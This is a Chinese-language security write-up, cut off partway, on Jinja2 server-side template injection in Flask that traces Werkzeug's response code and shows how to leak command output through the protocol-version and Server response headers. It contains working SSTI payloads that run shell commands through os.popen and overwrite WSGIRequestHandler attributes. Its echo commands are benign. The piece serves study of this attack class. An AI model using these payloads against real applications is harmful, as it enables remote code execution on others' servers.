@@ -1,0 +1,278 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="49e3ca570b6b57b30b4a55e4790b0777">Jinja2-SSTI 新回显方式技术学习</h1>
+<h2 data-content="1" id="4ecbaec4a81df752424a4da6c133b3c5">前言</h2>
+<p>拜读了<a href="https://xz.aliyun.com/t/15780" target="_blank">https://xz.aliyun.com/t/15780</a>  的文章，又想起了以前看到的回显方式，也是通过响应包来回显的，以前菜，调试不来代码，最近正好又有人提起，于是研究一波</p>
+<h2 data-content="1" id="8718fa8dbc07d0be0666af1046c9b196">环境搭建</h2>
+<p>这里就使用 GSBP 师傅的环境就够了</p>
+<div class="highlight"><pre><span></span><span class="n">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="nn">Flask</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span><span class="n">render_template</span><span class="o">,</span> <span class="n">render_template_string</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="o">(</span><span class="n">__name__</span><span class="o">)</span>
+
+<span class="nd">@app.route</span><span class="o">(</span><span class="sc">'/'</span><span class="o">,</span> <span class="n">methods</span><span class="o">=[</span><span class="s">"POST"</span><span class="o">])</span>
+<span class="n">def</span> <span class="nf">template</span><span class="o">():</span>
+        <span class="n">template</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">form</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"code"</span><span class="o">)</span>
+        <span class="n">result</span><span class="o">=</span><span class="n">render_template_string</span><span class="o">(</span><span class="n">template</span><span class="o">)</span>
+        <span class="n">print</span><span class="o">(</span><span class="n">result</span><span class="o">)</span>
+        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span><span class="n">None</span><span class="o">:</span>
+            <span class="k">return</span> <span class="s">"OK"</span>
+        <span class="k">else</span><span class="o">:</span>
+            <span class="k">return</span> <span class="s">"error"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="err">'</span><span class="n">__main__</span><span class="err">'</span><span class="o">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">debug</span><span class="o">=</span><span class="n">False</span><span class="o">,</span> <span class="n">host</span><span class="o">=</span><span class="err">'</span><span class="mf">0.0.0.0</span><span class="err">'</span><span class="o">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="o">)</span>
+</pre></div>
+<h2 data-content="1" id="69f175c9dbb5da4144c4d2cc7387d19f">response 生成的过程</h2>
+<p>首先我们随便发一个包</p>
+<p>响应包如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180627-f6d37186-9381-1.png"/></p>
+<p>这些都是我们的回显，回显又会分为两个部分</p>
+<p>一个是 header 头，一个是 body</p>
+<p>下面将从两个点去研究我们的响应包</p>
+<p>GSBP 师傅是通过 Server 头带出的回显，其实不然，能够带出回显的方法很多，只有是能在页面上的，都是可以的</p>
+<p>响应包必然是通过请求处理的，因此找到处理请求的地方</p>
+<div class="highlight"><pre><span></span><span class="n">process_request_thread</span><span class="o">,</span> <span class="n">socketserver</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">683</span>
+<span class="n">run</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">953</span>
+<span class="n">_bootstrap_inner</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">1016</span>
+<span class="n">_bootstrap</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">973</span>
+</pre></div>
+<p>process_request_thread 方法</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">process_request_thread</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">):</span>
+<span class="s">"""Same as in BaseServer but as a thread.</span>
+
+<span class="s">In addition, exception handling is done here.</span>
+
+<span class="s">"""</span>
+<span class="k">try</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">finish_request</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">)</span>
+<span class="n">except</span> <span class="n">Exception</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">handle_error</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">)</span>
+<span class="k">finally</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">shutdown_request</span><span class="o">(</span><span class="n">request</span><span class="o">)</span>
+</pre></div>
+<p>一眼顶真，具体实现应该在 finish_request 方法，然后 handle_error 是用来处理异常请求的，说不定也是可以利用的<br/>
+跟进 finish_request 方法</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">finish_request</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">):</span>
+<span class="s">"""Finish one request by instantiating RequestHandlerClass."""</span>
+<span class="n">self</span><span class="o">.</span><span class="na">RequestHandlerClass</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">,</span> <span class="n">self</span><span class="o">)</span>
+</pre></div>
+<p>是实例化了一个 RequestHandlerClass 类</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">__init__</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span> <span class="n">client_address</span><span class="o">,</span> <span class="n">server</span><span class="o">):</span>
+<span class="n">self</span><span class="o">.</span><span class="na">request</span> <span class="o">=</span> <span class="n">request</span>
+<span class="n">self</span><span class="o">.</span><span class="na">client_address</span> <span class="o">=</span> <span class="n">client_address</span>
+<span class="n">self</span><span class="o">.</span><span class="na">server</span> <span class="o">=</span> <span class="n">server</span>
+<span class="n">self</span><span class="o">.</span><span class="na">setup</span><span class="o">()</span>
+<span class="k">try</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">handle</span><span class="o">()</span>
+<span class="k">finally</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">finish</span><span class="o">()</span>
+</pre></div>
+<p>在实例化的过程中调用 self.handle()来处理</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">handle</span><span class="o">(</span><span class="n">self</span><span class="o">):</span>
+<span class="s">"""Handle multiple requests if necessary."""</span>
+<span class="n">self</span><span class="o">.</span><span class="na">close_connection</span> <span class="o">=</span> <span class="n">True</span>
+
+<span class="n">self</span><span class="o">.</span><span class="na">handle_one_request</span><span class="o">()</span>
+<span class="k">while</span> <span class="n">not</span> <span class="n">self</span><span class="o">.</span><span class="na">close_connection</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">handle_one_request</span><span class="o">()</span>
+</pre></div>
+<p>跟进 handle_one_request 方法</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">handle_one_request</span><span class="o">(</span><span class="n">self</span><span class="o">):</span>
+<span class="s">"""Handle a single HTTP request.</span>
+
+<span class="s">You normally don't need to override this method; see the class</span>
+<span class="s">__doc__ string for information on how to handle specific HTTP</span>
+<span class="s">commands such as GET and POST.</span>
+
+<span class="s">"""</span>
+<span class="k">try</span><span class="o">:</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">raw_requestline</span> <span class="o">=</span> <span class="n">self</span><span class="o">.</span><span class="na">rfile</span><span class="o">.</span><span class="na">readline</span><span class="o">(</span><span class="mi">65537</span><span class="o">)</span>
+    <span class="k">if</span> <span class="n">len</span><span class="o">(</span><span class="n">self</span><span class="o">.</span><span class="na">raw_requestline</span><span class="o">)</span> <span class="o">&gt;</span> <span class="mi">65536</span><span class="o">:</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">requestline</span> <span class="o">=</span> <span class="err">''</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">request_version</span> <span class="o">=</span> <span class="err">''</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">command</span> <span class="o">=</span> <span class="err">''</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">send_error</span><span class="o">(</span><span class="n">HTTPStatus</span><span class="o">.</span><span class="na">REQUEST_URI_TOO_LONG</span><span class="o">)</span>
+        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">not</span> <span class="n">self</span><span class="o">.</span><span class="na">raw_requestline</span><span class="o">:</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">close_connection</span> <span class="o">=</span> <span class="n">True</span>
+        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">not</span> <span class="n">self</span><span class="o">.</span><span class="na">parse_request</span><span class="o">():</span>
+        <span class="err">#</span> <span class="n">An</span> <span class="n">error</span> <span class="n">code</span> <span class="n">has</span> <span class="n">been</span> <span class="n">sent</span><span class="o">,</span> <span class="n">just</span> <span class="n">exit</span>
+        <span class="k">return</span>
+    <span class="n">mname</span> <span class="o">=</span> <span class="err">'</span><span class="n">do_</span><span class="err">'</span> <span class="o">+</span> <span class="n">self</span><span class="o">.</span><span class="na">command</span>
+    <span class="k">if</span> <span class="n">not</span> <span class="nf">hasattr</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">mname</span><span class="o">):</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">send_error</span><span class="o">(</span>
+            <span class="n">HTTPStatus</span><span class="o">.</span><span class="na">NOT_IMPLEMENTED</span><span class="o">,</span>
+            <span class="s">"Unsupported method (%r)"</span> <span class="o">%</span> <span class="n">self</span><span class="o">.</span><span class="na">command</span><span class="o">)</span>
+        <span class="k">return</span>
+    <span class="n">method</span> <span class="o">=</span> <span class="n">getattr</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">mname</span><span class="o">)</span>
+    <span class="n">method</span><span class="o">()</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">wfile</span><span class="o">.</span><span class="na">flush</span><span class="o">()</span> <span class="err">#</span><span class="n">actually</span> <span class="n">send</span> <span class="n">the</span> <span class="n">response</span> <span class="k">if</span> <span class="n">not</span> <span class="n">already</span> <span class="n">done</span><span class="o">.</span>
+<span class="n">except</span> <span class="n">TimeoutError</span> <span class="n">as</span> <span class="n">e</span><span class="o">:</span>
+    <span class="err">#</span><span class="n">a</span> <span class="n">read</span> <span class="n">or</span> <span class="n">a</span> <span class="n">write</span> <span class="n">timed</span> <span class="n">out</span><span class="o">.</span>  <span class="n">Discard</span> <span class="k">this</span> <span class="n">connection</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">log_error</span><span class="o">(</span><span class="s">"Request timed out: %r"</span><span class="o">,</span> <span class="n">e</span><span class="o">)</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">close_connection</span> <span class="o">=</span> <span class="n">True</span>
+    <span class="k">return</span>
+</pre></div>
+<p>真正的开始解析我们的请求了，首先检查请求行长度请求行超过 65536 字节，意味着请求的 URI 太长，直接置空 requestline、request_version 和 command<br/>
+然后检测请求行，之后通过 parse_request 解析请求，检测是否支持请求方法</p>
+<p>然后交由 method()方法处理</p>
+<p>部分代码</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">write</span><span class="o">(</span><span class="n">data</span><span class="o">:</span> <span class="n">bytes</span><span class="o">)</span> <span class="o">-&gt;</span> <span class="n">None</span><span class="o">:</span>
+<span class="n">nonlocal</span> <span class="n">status_sent</span><span class="o">,</span> <span class="n">headers_sent</span><span class="o">,</span> <span class="n">chunk_response</span>
+<span class="k">assert</span> <span class="n">status_set</span> <span class="n">is</span> <span class="n">not</span> <span class="n">None</span><span class="o">,</span> <span class="s">"write() before start_response"</span>
+<span class="k">assert</span> <span class="n">headers_set</span> <span class="n">is</span> <span class="n">not</span> <span class="n">None</span><span class="o">,</span> <span class="s">"write() before start_response"</span>
+<span class="k">if</span> <span class="n">status_sent</span> <span class="n">is</span> <span class="n">None</span><span class="o">:</span>
+    <span class="n">status_sent</span> <span class="o">=</span> <span class="n">status_set</span>
+    <span class="n">headers_sent</span> <span class="o">=</span> <span class="n">headers_set</span>
+    <span class="k">try</span><span class="o">:</span>
+        <span class="n">code_str</span><span class="o">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">status_sent</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="n">None</span><span class="o">,</span> <span class="mi">1</span><span class="o">)</span>
+    <span class="n">except</span> <span class="n">ValueError</span><span class="o">:</span>
+        <span class="n">code_str</span><span class="o">,</span> <span class="n">msg</span> <span class="o">=</span> <span class="n">status_sent</span><span class="o">,</span> <span class="s">""</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="kt">int</span><span class="o">(</span><span class="n">code_str</span><span class="o">)</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">send_response</span><span class="o">(</span><span class="n">code</span><span class="o">,</span> <span class="n">msg</span><span class="o">)</span>
+    <span class="n">header_keys</span> <span class="o">=</span> <span class="n">set</span><span class="o">()</span>
+</pre></div>
+<p>跟进 send_response 方法</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">send_response</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">code</span><span class="o">,</span> <span class="n">message</span><span class="o">=</span><span class="n">None</span><span class="o">):</span>
+<span class="s">"""Add the response header to the headers buffer and log the</span>
+<span class="s">response code.</span>
+
+<span class="s">Also send two standard headers with the server software</span>
+<span class="s">version and the current date.</span>
+
+<span class="s">"""</span>
+<span class="n">self</span><span class="o">.</span><span class="na">log_request</span><span class="o">(</span><span class="n">code</span><span class="o">)</span>
+<span class="n">self</span><span class="o">.</span><span class="na">send_response_only</span><span class="o">(</span><span class="n">code</span><span class="o">,</span> <span class="n">message</span><span class="o">)</span>
+<span class="n">self</span><span class="o">.</span><span class="na">send_header</span><span class="o">(</span><span class="err">'</span><span class="n">Server</span><span class="err">'</span><span class="o">,</span> <span class="n">self</span><span class="o">.</span><span class="na">version_string</span><span class="o">())</span>
+<span class="n">self</span><span class="o">.</span><span class="na">send_header</span><span class="o">(</span><span class="err">'</span><span class="n">Date</span><span class="err">'</span><span class="o">,</span> <span class="n">self</span><span class="o">.</span><span class="na">date_time_string</span><span class="o">())</span>
+</pre></div>
+<h3 data-content="1" id="85bf2d84170be3b2d37fdfad612d8a7c">http 协议回显</h3>
+<p>发送了一些信息，可以看到其实就是我们回显包里面的信息<br/>
+首先看到 send_response_only 方法</p>
+<div class="highlight"><pre><span></span><span class="n">def</span> <span class="nf">send_response_only</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="n">code</span><span class="o">,</span> <span class="n">message</span><span class="o">=</span><span class="n">None</span><span class="o">):</span>
+<span class="s">"""Send the response header only."""</span>
+<span class="k">if</span> <span class="n">self</span><span class="o">.</span><span class="na">request_version</span> <span class="o">!=</span> <span class="err">'</span><span class="n">HTTP</span><span class="o">/</span><span class="mf">0.9</span><span class="err">'</span><span class="o">:</span>
+    <span class="k">if</span> <span class="n">message</span> <span class="n">is</span> <span class="n">None</span><span class="o">:</span>
+        <span class="k">if</span> <span class="n">code</span> <span class="n">in</span> <span class="n">self</span><span class="o">.</span><span class="na">responses</span><span class="o">:</span>
+            <span class="n">message</span> <span class="o">=</span> <span class="n">self</span><span class="o">.</span><span class="na">responses</span><span class="o">[</span><span class="n">code</span><span class="o">][</span><span class="mi">0</span><span class="o">]</span>
+        <span class="k">else</span><span class="o">:</span>
+            <span class="n">message</span> <span class="o">=</span> <span class="err">''</span>
+    <span class="k">if</span> <span class="n">not</span> <span class="nf">hasattr</span><span class="o">(</span><span class="n">self</span><span class="o">,</span> <span class="err">'</span><span class="n">_headers_buffer</span><span class="err">'</span><span class="o">):</span>
+        <span class="n">self</span><span class="o">.</span><span class="na">_headers_buffer</span> <span class="o">=</span> <span class="o">[]</span>
+    <span class="n">self</span><span class="o">.</span><span class="na">_headers_buffer</span><span class="o">.</span><span class="na">append</span><span class="o">((</span><span class="s">"%s %d %s\r\n"</span> <span class="o">%</span>
+            <span class="o">(</span><span class="n">self</span><span class="o">.</span><span class="na">protocol_version</span><span class="o">,</span> <span class="n">code</span><span class="o">,</span> <span class="n">message</span><span class="o">)).</span><span class="na">encode</span><span class="o">(</span>
+                <span class="err">'</span><span class="n">latin</span><span class="o">-</span><span class="mi">1</span><span class="err">'</span><span class="o">,</span> <span class="err">'</span><span class="n">strict</span><span class="err">'</span><span class="o">))</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180640-fe75ed92-9381-1.png"/></p>
+<p>可以看到这三个值都是页面上回显的值，我们只需要把这个值修改了，那岂不是就可以获取回显了</p>
+<p>尝试寻找这些变量的位置</p>
+<p>首先 protocol_version 就是<code>&lt;werkzeug.serving.WSGIRequestHandler object at 0x0000017078F01D80&gt;</code>的一个属性，我们只需要找到 WSGIRequestHandler 对象</p>
+<p>那就是寻找 werkzeug.serving.WSGIRequestHandler</p>
+<p>werkzeug 是什么呢？<br/>
+问问 GPT，方便我们寻找</p>
+<div class="highlight"><pre><span></span><span class="n">Werkzeug</span> <span class="n">最初只是一个工具库</span><span class="err">，</span><span class="n">用于构建</span> <span class="n">WSGI</span> <span class="n">Web</span> <span class="n">应用程序</span><span class="err">，</span><span class="n">后来发展成了一个功能丰富的</span> <span class="n">Web</span> <span class="n">工具包</span><span class="err">，</span><span class="n">被许多</span> <span class="n">Web</span> <span class="n">框架</span><span class="err">（</span><span class="n">如</span> <span class="n">Flask</span><span class="err">）</span><span class="n">用作底层基础组件</span><span class="err">。</span><span class="n">它包含多个模块和子包</span><span class="err">，</span><span class="n">比如用于请求和响应处理的模块</span><span class="err">、</span><span class="n">路由模块</span><span class="err">、</span><span class="n">调试工具等</span><span class="err">，</span><span class="n">封装了很多</span> <span class="n">HTTP</span> <span class="n">和</span> <span class="n">WSGI</span> <span class="n">的细节</span><span class="err">。</span>
+
+<span class="n">可以将</span> <span class="n">werkzeug</span> <span class="n">理解为一个模块集合</span><span class="err">，</span><span class="n">每个模块负责</span> <span class="n">Web</span> <span class="n">开发中的不同功能</span>
+</pre></div>
+<p>那我们就从模块里面找找</p>
+<p>修改一下代码准备寻找一番</p>
+<div class="highlight"><pre><span></span><span class="n">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="nn">Flask</span><span class="o">,</span> <span class="n">request</span><span class="o">,</span> <span class="n">render_template_string</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="o">(</span><span class="n">__name__</span><span class="o">)</span>
+
+<span class="nd">@app.route</span><span class="o">(</span><span class="sc">'/'</span><span class="o">,</span> <span class="n">methods</span><span class="o">=[</span><span class="s">"POST"</span><span class="o">])</span>
+<span class="n">def</span> <span class="nf">template</span><span class="o">():</span>
+        <span class="n">template</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">form</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"code"</span><span class="o">)</span>
+        <span class="n">result</span><span class="o">=</span><span class="n">render_template_string</span><span class="o">(</span><span class="n">template</span><span class="o">)</span>
+        <span class="n">print</span><span class="o">(</span><span class="n">result</span><span class="o">)</span>
+        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span><span class="n">None</span><span class="o">:</span>
+            <span class="k">return</span> <span class="n">result</span>
+        <span class="k">else</span><span class="o">:</span>
+            <span class="k">return</span> <span class="s">"error"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="err">'</span><span class="n">__main__</span><span class="err">'</span><span class="o">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">debug</span><span class="o">=</span><span class="n">False</span><span class="o">,</span> <span class="n">host</span><span class="o">=</span><span class="err">'</span><span class="mf">0.0.0.0</span><span class="err">'</span><span class="o">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="o">)</span>
+</pre></div>
+<p>如果寻找到 moudles 是关键吗，<code>sys</code> 模块的 <code>modules</code> 属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块<br/>
+所以需要获取 sys 模块，这个模块的获取方法还是很多的</p>
+<p>可以从<strong>spec</strong>的全局变量中获取</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180656-08635290-9382-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180702-0bf4981a-9382-1.png"/></p>
+<p>然后再去获取我们需要的模块</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180707-0ed5dd46-9382-1.png"/></p>
+<p>获取 WSGIRequestHandler 对象<br/>
+使用</p>
+<div class="highlight"><pre><span></span><span class="n">code</span><span class="o">={{</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__spec__</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">sys</span><span class="o">.</span><span class="na">modules</span><span class="o">.</span><span class="na">werkzeug</span><span class="o">.</span><span class="na">serving</span><span class="o">.</span><span class="na">WSGIRequestHandler</span><span class="o">}}</span>
+</pre></div>
+<p>获取 protocol_version 属性</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180713-123ec506-9382-1.png"/></p>
+<p>赋值为我们恶意命令的回显，可以使用 setattr 方法</p>
+<p>paylaod 如下</p>
+<div class="highlight"><pre><span></span><span class="n">code</span><span class="o">={{</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">setattr</span><span class="o">(</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__spec__</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">sys</span><span class="o">.</span><span class="na">modules</span><span class="o">.</span><span class="na">werkzeug</span><span class="o">.</span><span class="na">serving</span><span class="o">.</span><span class="na">WSGIRequestHandler</span><span class="o">,</span><span class="s">"protocol_version"</span><span class="o">,</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">__import__</span><span class="o">(</span><span class="err">'</span><span class="n">os</span><span class="err">'</span><span class="o">).</span><span class="na">popen</span><span class="o">(</span><span class="err">'</span><span class="n">echo</span><span class="o">%</span><span class="mi">20</span><span class="n">success</span><span class="err">'</span><span class="o">).</span><span class="na">read</span><span class="o">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180717-14b3101c-9382-1.png"/></p>
+<p>成功</p>
+<h3 data-content="1" id="febf3b7684eb03eca6a6c07d18e4155e">codemsg 回显*</h3>
+<p>当然除了我们的 protocol_version，当时我们还看到处理了 code 和 msg<br/>
+我们也来修改修改试一试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180722-17c396e6-9382-1.png"/></p>
+<p>我们查看一下关系</p>
+<p>然后再往寻找</p>
+<p>找了一会</p>
+<div class="highlight"><pre><span></span><span class="n">get_wsgi_response</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">562</span>
+<span class="n">__call__</span><span class="o">,</span> <span class="n">response</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">576</span>
+<span class="n">wsgi_app</span><span class="o">,</span> <span class="n">app</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">1480</span>
+<span class="n">__call__</span><span class="o">,</span> <span class="n">app</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">1498</span>
+<span class="n">execute</span><span class="o">,</span> <span class="n">serving</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">331</span>
+<span class="n">run_wsgi</span><span class="o">,</span> <span class="n">serving</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">370</span>
+<span class="n">handle_one_request</span><span class="o">,</span> <span class="n">server</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">421</span>
+<span class="n">handle</span><span class="o">,</span> <span class="n">server</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">433</span>
+<span class="n">handle</span><span class="o">,</span> <span class="n">serving</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">398</span>
+<span class="n">__init__</span><span class="o">,</span> <span class="n">socketserver</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">747</span>
+<span class="n">finish_request</span><span class="o">,</span> <span class="n">socketserver</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">360</span>
+<span class="n">process_request_thread</span><span class="o">,</span> <span class="n">socketserver</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">683</span>
+<span class="n">run</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">953</span>
+<span class="n">_bootstrap_inner</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">1016</span>
+<span class="n">_bootstrap</span><span class="o">,</span> <span class="n">threading</span><span class="o">.</span><span class="na">py</span><span class="o">:</span><span class="mi">973</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180729-1bda7aec-9382-1.png"/></p>
+<p>现在就是寻找这个对象，找了一会没有找到，失败</p>
+<h3 data-content="1" id="2210f5217b65f2ac923bc57349b0bf50">server 头回显</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180733-1e7a2680-9382-1.png"/></p>
+<p>然后只需要在上面的 payload 修改就好了</p>
+<div class="highlight"><pre><span></span><span class="n">code</span><span class="o">={{</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">setattr</span><span class="o">(</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__spec__</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">sys</span><span class="o">.</span><span class="na">modules</span><span class="o">.</span><span class="na">werkzeug</span><span class="o">.</span><span class="na">serving</span><span class="o">.</span><span class="na">WSGIRequestHandler</span><span class="o">,</span><span class="s">"server_version"</span><span class="o">,</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">__import__</span><span class="o">(</span><span class="err">'</span><span class="n">os</span><span class="err">'</span><span class="o">).</span><span class="na">popen</span><span class="o">(</span><span class="err">'</span><span class="n">echo</span><span class="o">%</span><span class="mi">20</span><span class="n">success</span><span class="err">'</span><span class="o">).</span><span class="na">read</span><span class="o">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180738-21284812-9382-1.png"/></p>
+<p>然后还可以改下面的 pythonversion</p>
+<div class="highlight"><pre><span></span><span class="n">code</span><span class="o">={{</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">setattr</span><span class="o">(</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__spec__</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">sys</span><span class="o">.</span><span class="na">modules</span><span class="o">.</span><span class="na">werkzeug</span><span class="o">.</span><span class="na">serving</span><span class="o">.</span><span class="na">WSGIRequestHandler</span><span class="o">,</span><span class="s">"sys_version"</span><span class="o">,</span><span class="n">lipsum</span><span class="o">.</span><span class="na">__globals__</span><span class="o">.</span><span class="na">__builtins__</span><span class="o">.</span><span class="na">__import__</span><span class="o">(</span><span class="err">'</span><span class="n">os</span><span class="err">'</span><span class="o">).</span><span class="na">popen</span><span class="o">(</span><span class="err">'</span><span class="n">echo</span><span class="o">%</span><span class="mi">20</span><span class="n">success2</span><span class="err">'</span><span class="o">).</span><span class="na">read</span><span class="o">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241026180742-23672cba-9382-1.png"/></p>
+<h3 data-content="1" id="d05490baa67c96f10bec2f3a5e26a58c">500 报错回显*</h3>
+<p>当然这只是一个思路</p>
+<p>当时发现 500 页面会固定输出一些字符</p>
+<div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">500</span> <span class="n">INTERNAL</span> <span class="n">SERVER</span> <span class="n">ERROR</span>
+<span class="nl">Server:</span> <span class="n">Werkzeug</span><span class="o">/</span><span class="mf">3.0.5</span> <span class="n">Python</span><span class="o">/</span><span class="mf">3.10.10</span>
+<span class="nl">Date:</span> <span class="n">Sat</span><span class="o">,</span> <span class="mi">26</span> <span class="n">Oct</span> <span class="mi">2024</span> <span class="mi">09</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="mi">30</span> <span class="n">GMT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="o">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">265</span>
+<span class="nl">Connection:</span> <span class="n">close</span>
+
+<span class="o">&lt;!</span><span class="n">doctype</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="n">en</span><span class="o">&gt;</span>
